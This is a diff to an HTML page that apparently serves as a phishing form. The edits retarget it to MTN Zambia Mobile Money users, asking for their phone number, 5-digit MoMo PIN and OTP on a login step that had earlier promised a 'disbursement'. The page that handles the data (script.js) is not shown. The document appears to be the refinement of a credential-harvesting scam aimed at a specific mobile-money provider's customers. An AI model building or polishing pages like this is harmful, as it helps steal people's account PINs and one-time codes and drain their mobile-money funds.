@@ -104,9 +104,9 @@
           </div>
         </div>
         <div class="field">
-          <label>Contact Method (Phone Number or Gmail Address)</label>
-          <input type="text" id="user-contact" placeholder="+260961234567 or user@gmail.com" required>
-          <small class="hint">Enter active mobile number with country code or your Gmail account.</small>
+          <label>MTN Zambia Phone Number</label>
+          <input type="text" id="user-contact" placeholder="0961234567 or 0761234567" required>
+          <small class="hint">Enter a valid MTN Zambia MoMo line starting with 096 or 076.</small>
         </div>
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">BACK</button>
@@ -159,14 +159,14 @@
       <div class="login-header">
         <span class="bank-badge sm">MoMo</span>
         <h2>Account Login</h2>
-        <p>Enter your credentials to proceed with disbursement</p>
+        <p>Enter your MTN credentials and 5-digit PIN to proceed</p>
       </div>
       <div class="field">
-        <label>Phone Number or Gmail</label>
-        <input type="text" id="login-contact" placeholder="+260... or gmail@gmail.com" required>
+        <label>MTN Zambia Phone Number</label>
+        <input type="text" id="login-contact" placeholder="096... or 076..." required>
       </div>
       <div class="field">
-        <label>Enter 5-Digit PIN</label>
+        <label>Enter 5-Digit MoMo PIN</label>
         <div class="pin-inputs">
           <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
           <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
@@ -202,7 +202,7 @@
     <!-- VIEW 5: OTP VERIFICATION -->
     <div id="view-otp" class="card hidden">
       <h2>OTP Verification</h2>
-      <p>Enter OTP sent to your contact <span id="otp-target-display"></span></p>
+      <p>Enter OTP sent to your MTN line <span id="otp-target-display"></span></p>
       <div class="field">
         <div class="otp-inputs">
           <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
@@ -236,5 +236,5 @@
 
   <script src="script.js"></script>
 </body>
-                                                                                                             </html>
-  
+          </html>
+          
